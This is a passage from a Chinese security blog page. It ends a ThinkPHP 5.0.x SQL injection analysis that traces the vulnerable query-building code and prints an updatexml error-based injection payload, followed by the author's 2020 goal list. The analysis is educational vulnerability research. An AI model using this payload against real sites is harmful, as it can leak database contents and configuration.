                $this-&gt;parseGroup($options[&#39;group&#39;]),
                $this-&gt;parseHaving($options[&#39;having&#39;]),
                $this-&gt;parseOrder($options[&#39;order&#39;], $options),
                $this-&gt;parseLimit($options[&#39;limit&#39;]),
                $this-&gt;parseUnion($options[&#39;union&#39;]),
                $this-&gt;parseLock($options[&#39;lock&#39;]),
                $this-&gt;parseComment($options[&#39;comment&#39;]),
                $this-&gt;parseForce($options[&#39;force&#39;]),
            ], $this-&gt;selectSql);
        return $sql;
    }</code></pre>
<p>这个<code>$this-&gt;parseWhere($options[&#39;where&#39;], $options)</code>分支进入了关键的漏洞位置,此时<code>$where</code>可控</p>
<pre><code class="php">protected function parseWhere($where, $options)
    {
        $whereStr = $this-&gt;buildWhere($where, $options);
        ...
        return empty($whereStr) ? &#39;&#39; : &#39; WHERE &#39; . $whereStr;
    }</code></pre>
<p>再跟进<code>$this-&gt;buildWhere($where, $options)</code>,此时<code>$where</code>可控</p>
<pre><code class="php">public function buildWhere($where, $options)
    {
        if (empty($where)) {
            $where = [];
        }

        if ($where instanceof Query) {
            return $this-&gt;buildWhere($where-&gt;getOptions(&#39;where&#39;), $options);
        }

        $whereStr = &#39;&#39;;
        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);
        foreach ($where as $key =&gt; $val) {
            $str = [];
            foreach ($val as $field =&gt; $value) {
                ...
                    // 对字段使用表达式查询
                    $field = is_string($field) ? $field : &#39;&#39;;
                    $str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);

            }

            $whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);
        }

        return $whereStr;
    }</code></pre>
<p><code>$whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);</code>这个生成了sql语句的where部分,其中<code>$str</code>是由<code>$str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code>生成的,而参数<code>$value[1]</code>就是我们<code>ids[1,updatexml(0,concat(0x7e,(database()),0x7e),1)]=123%23</code>payload中的键值</p>
<p>跟进<code>$this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code></p>
<pre><code class="php">protected function parseWhereItem($field, $val, $rule = &#39;&#39;, $options = [], $binds = [], $bindName = null)
    {
        $key = $field ? $this-&gt;parseKey($field, $options) : &#39;&#39;;

        // 查询规则和条件
        if (!is_array($val)) {
            $val = [&#39;=&#39;, $val];
        }
        list($exp, $value) = $val;
        // 字段分析
        if(....){
            ...
        } elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) {
            // IN 查询
            if ($value instanceof \Closure) {
                $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);
            } else {
                $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);
                if (array_key_exists($field, $binds)) {
                    $bind  = [];
                    $array = [];
                    foreach ($value as $k =&gt; $v) {
                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {
                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;
                        } else {
                            $bindKey = $bindName . &#39;_in_&#39; . $k;
                        }
                        $bind[$bindKey] = [$v, $bindType];
                        $array[]        = &#39;:&#39; . $bindKey;
                    }
                    $this-&gt;query-&gt;bind($bind);
                    $zone = implode(&#39;,&#39;, $array);
                } else {
                    $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));
                }
                $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;
            }
        } 
        return $whereStr;
    }</code></pre>
<p>然后我们可以看到当<code>in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])</code>条件满足时,将会直接将我们payload中的键值直接拼接到sql语句中</p>
<pre><code class="php">                foreach ($value as $k =&gt; $v) {
                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {
                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;
                        } else {
                            $bindKey = $bindName . &#39;_in_&#39; . $k;
                        }
                        $bind[$bindKey] = [$v, $bindType];
                        $array[]        = &#39;:&#39; . $bindKey;
                    }</code></pre>
<p>而<code>$exp</code>则由<code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code>中的<code>&#39;in&#39;</code>经过一系列操作后得到</p>
<p>但是这里只能进行没有子查询语句的sql报错注入</p>
<p>如果有子查询语句的话就会报<code>SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported</code>的错误</p>
<p>所以这个sql注入有点不行,但时sql报错会暴露数据库配置却是非常有用的</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html" target="_blank" rel="noopener">https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</a> </p>
<p> <a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a> </p>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/02/01/ThinkPHP框架5.0.x_SQL注入分析/">https://explorersss.github.io/2020/02/01/ThinkPHP框架5.0.x_SQL注入分析/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://explorersss.github.io/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" data-id="ck634fc870000mcv0c6x7gg1c" data-title="ThinkPHP框架5.0.x_SQL注入分析" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-我的2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/01/31/%E6%88%91%E7%9A%842020/" class="article-date">
  <time class="dt-published" datetime="2020-01-31T15:11:23.717Z" itemprop="datePublished">2020-01-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/01/31/%E6%88%91%E7%9A%842020/">我的2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="我的2020"><a href="#我的2020" class="headerlink" title="我的2020"></a>我的2020</h1><h2 id="这个是啥"><a href="#这个是啥" class="headerlink" title="这个是啥"></a>这个是啥</h2><p>这是一个目标清单,来记录我2020年想要完成的事情.</p>
<h2 id="写这个的原因"><a href="#写这个的原因" class="headerlink" title="写这个的原因"></a>写这个的原因</h2><p><strong>我想要在大学毕业后,很自然的认为:我的大学是充实的,是我每一天认认真真的走过去的.我可以自豪的承认自己的优秀</strong></p>
<p><img src="https://i.loli.net/2020/01/31/7OHm9wbEsVYgfd3.png" alt="image173"></p>
<p>我想要变得更加优秀,我想活出自己</p>
<h2 id="如何更新-更新规则"><a href="#如何更新-更新规则" class="headerlink" title="如何更新/更新规则"></a>如何更新/更新规则</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>目标是清晰明确的,量化的</li>
<li>目标难度要适合,不能太简单也不能不可实现</li>
<li>如果无法确定今年的目标,那就确定这个月的吧</li>
<li>根据实际情况对目标进行调整</li>
<li>从自己所能想到的最远的地方(目标/梦想/想法)开始制定目标</li>
</ol>
<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><ol>
<li>举例:我要好好学习(x); 我要学习编程方面的知识,达到能够独立编写自己的博客系统(√)</li>
<li>太简单的目标有必要制定吗,无法实现的目标有必要写下来吗.难度适合的目标可以给予自己一种正反馈,使自己更有信心实现目标,并能从中获取乐趣</li>
<li>行动是有目的的，而从高到低，从整体到局部，会让你清晰的认识到你现在要怎么做，为什么要这么做，你未来的路在何方会更加清晰，如果某个地方你想不出来，那就缩小范围，你无法考虑你人生的目的，但你可以思考未来10年的方向，可能未来十年也太难下定论，未来一年，一个月，一星期却是可以的。 </li>
<li>因为周围的变化,对目标的不了解等等因素导致可能会制定过难/过易/没有意义的目标,所以要根据实际情况进行调整(不是叫我偷懒哦)</li>
<li>小目标永远是为大目标/梦想/想法服务的</li>
</ol>
<h2 id="将目标转为计划的规则"><a href="#将目标转为计划的规则" class="headerlink" title="将目标转为计划的规则"></a>将目标转为计划的规则</h2><ol>
<li>分解细致，能力可达，留有余地</li>
<li>奖惩并行</li>
<li>每个星期总结一次,计划是否合理</li>
</ol>
<h2 id="所能想到的最远的目标-想法-梦想"><a href="#所能想到的最远的目标-想法-梦想" class="headerlink" title="所能想到的最远的目标/想法/梦想"></a>所能想到的最远的目标/想法/梦想</h2><ol>
<li>在自己热爱的事业上获得可观的收入</li>
<li>身体健康,三观尚在 </li>
<li>开发一个类似hexo的python程序</li>
</ol>
<h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><p>寒假期间延迟到2.22(不改我完成不了拉)</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 寒假期间补天挖洞获得18个库币(买这个 <a href="https://www.butian.net/Shop/detail/?id=700399" target="_blank" rel="noopener">https://www.butian.net/Shop/detail/?id=700399</a> )</li>
<li><input disabled="" type="checkbox"> 寒假期间复现30个cve(11/30)</li>
<li><input disabled="" type="checkbox"> 寒假期间代码审计一个小cms,找出尽可能多的漏洞</li>
<li><input disabled="" type="checkbox"> 寒假看完码农翻身(1/3)</li>
</ul>
<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2020/01/31/我的2020/">https://explorersss.github.io/2020/01/31/我的2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://explorersss.github.io/2020/01/31/%E6%88%91%E7%9A%842020/" data-id="ck62b2d0b0000q0v0avlphkx9" data-title="我的2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">杂</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">漏洞挖掘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/ctf/" style="font-size: 17.5px;">ctf</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 20px;">cve复现</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/wp/" style="font-size: 12.5px;">wp</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 15px;">小工具</a> <a href="/tags/%E6%9D%82/" style="font-size: 10px;">杂</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">漏洞挖掘</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">线上赛</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12.5px;">编程</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">记录</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/02/12/phpcms960%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%8D%E7%8E%B0/">phpcms960任意文件上传复现</a>
          </li>
        
          <li>
            <a href="/2020/02/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">记一次漏洞挖掘</a>
          </li>
        
          <li>
            <a href="/2020/02/10/DedeCMS%205.7%20plusguestbook.php%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">DedeCMS 5.7 plusguestbook.php注入漏洞</a>
          </li>
        
          <li>
            <a href="/2020/02/08/S2-013_S2-014%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">S2-013_S2-014远程代码执行漏洞</a>
          </li>
        
          <li>
            <a href="/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/">Tomcat PUT方法任意写文件漏洞CVE-2017-12615</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>